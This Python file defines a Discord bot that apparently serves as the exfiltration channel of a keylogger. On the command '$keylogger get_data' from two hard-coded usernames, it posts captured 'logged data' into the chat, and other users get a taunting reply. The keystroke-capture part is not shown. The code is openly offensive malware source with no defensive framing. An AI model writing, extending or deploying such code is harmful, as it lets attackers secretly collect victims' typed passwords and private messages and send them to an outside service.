import discord
from dotenv import load_dotenv
import os


class DiscordBot:
    def __init__(self, data_obj):
        load_dotenv()

        intents = discord.Intents.default()
        intents.message_content = True

        client = discord.Client(intents=intents)

        @client.event
        async def on_ready():
            print(f'We have logged in as {client.user}')

        @client.event
        async def on_message(message):
            if message.author == client.user:
                return

            if message.content.startswith('$keylogger get_data'):
                if str(message.author)=='async_sunlight' or str(message.author)=='san3507':
                    await message.channel.send(f"New logged data is : ```{data_obj()}```")
                else:
                    await message.channel.send("this is not for you love 😘")

        client.run(str(os.getenv('TOKEN')))
